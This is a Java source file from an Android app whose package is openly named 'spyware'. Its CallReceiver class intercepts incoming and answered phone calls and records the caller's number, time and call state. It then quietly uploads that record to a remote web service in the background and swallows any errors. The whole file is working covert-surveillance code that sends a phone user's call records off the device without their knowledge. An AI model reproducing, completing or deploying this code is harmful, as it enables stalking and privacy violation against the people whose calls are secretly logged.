package com.example.tienbi.spyware.receiver;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.net.ConnectivityManager;
import android.net.NetworkInfo;
import android.os.AsyncTask;
import android.os.Bundle;
import android.telephony.TelephonyManager;

import com.example.tienbi.spyware.mode.CallInfo;
import com.example.tienbi.spyware.mode.WebService;

import java.text.SimpleDateFormat;
import java.util.Calendar;

/**
 * Created by TienBi on 15/09/2016.
 */
public class CallReceiver extends BroadcastReceiver{
    public boolean isConnect(Context context){
        ConnectivityManager cm =
                (ConnectivityManager) context.getSystemService(Context.CONNECTIVITY_SERVICE);
        NetworkInfo netInfo = cm.getActiveNetworkInfo();
        boolean b= netInfo != null && netInfo.isConnectedOrConnecting();
        return b;
    }
    @Override
    public void onReceive(Context context, Intent intent) {
        if(isConnect(context))
        {
            try
            {
                sent(context,intent);
            }
            catch(Exception ex)
            {
            }
        }
        else
        {
        }
    }

    private void sent(Context c,Intent intent) {
        Bundle bundle=intent.getExtras();
        if(bundle==null)
            return;
        String number=bundle.getString("incoming_number");
        if (number==null)
            return;
        String s=bundle.getString(TelephonyManager.EXTRA_STATE);
        Calendar cal = Calendar.getInstance();
        SimpleDateFormat sdf = new SimpleDateFormat("dd-MM-yyyy  HH:mm:ss a");
        String date = sdf.format(cal.getTime());
        CallTask callTask= new CallTask();
        if(s.equals(TelephonyManager.EXTRA_STATE_RINGING))
        {
            callTask.execute(new CallInfo(number,date,-1));
        }
        if(s.equals(TelephonyManager.EXTRA_STATE_OFFHOOK))
        {
            callTask.execute(new CallInfo(number,date,1));
        }
    }
    class CallTask extends AsyncTask<CallInfo,Void,Void>{
        @Override
        protected Void doInBackground(CallInfo... params) {
            CallInfo call =params[0];
            WebService ws=new WebService();
            ws.saveCall(call.getPhoneNumber(),call.getTime(),call.getStatus());
            return null;
        }

        @Override
        protected void onPreExecute() {
            super.onPreExecute();
        }

        @Override
        protected void onPostExecute(Void aVoid) {
            super.onPostExecute(aVoid);
        }

        @Override
        protected void onProgressUpdate(Void... values) {
            super.onProgressUpdate(values);
        }
    }
}
